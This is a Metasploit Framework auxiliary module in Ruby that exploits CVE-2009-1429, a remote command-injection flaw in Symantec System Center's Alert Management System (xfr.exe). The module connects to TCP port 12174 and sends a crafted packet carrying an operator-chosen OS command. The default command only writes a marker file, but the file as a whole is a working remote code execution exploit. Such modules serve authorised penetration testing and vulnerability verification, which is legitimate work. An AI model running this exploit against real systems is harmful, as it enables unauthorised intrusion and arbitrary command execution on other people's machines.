##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	Rank = ExcellentRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Symantec System Center Alert Management System (xfr.exe) Arbitrary Command Execution',
			'Description'    => %q{
					Symantec System Center Alert Management System is prone to a remote command-injection vulnerability
					because the application fails to properly sanitize user-supplied input.
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'CVE', '2009-1429' ],
					[ 'BID', '34671' ],
					[ 'OSVDB', '54157' ],
					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-09-060/' ],
					[ 'URL', 'http://www.symantec.com/business/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&suid=20090428_02' ]
				],
			'DisclosureDate' => 'Apr 28 2009'))

			register_options(
				[
					Opt::RPORT(12174),
					OptString.new('CMD', [ false, 'The OS command to execute', 'cmd /c echo metasploit > %SYSTEMDRIVE%\metasploit.txt']),
				], self.class)
	end

	def run
		begin
			connect

				len  = 2 + datastore['CMD'].length

				data =  [0x00000000].pack('V')
				data << len.chr
				data << "\x00"
				data << datastore['CMD'] + " "
				data << "\x00"

				print_status("Sending command: #{datastore['CMD']}")
				sock.put(data)

				res = sock.get_once

					if (!res)
						print_error("Did not recieve data. Failed?")
					else
						print_status("Got data, execution successful!")
					end

				disconnect
		rescue ::Exception
		print_error("Error: #{$!.class} #{$!}")
		end
	end
end
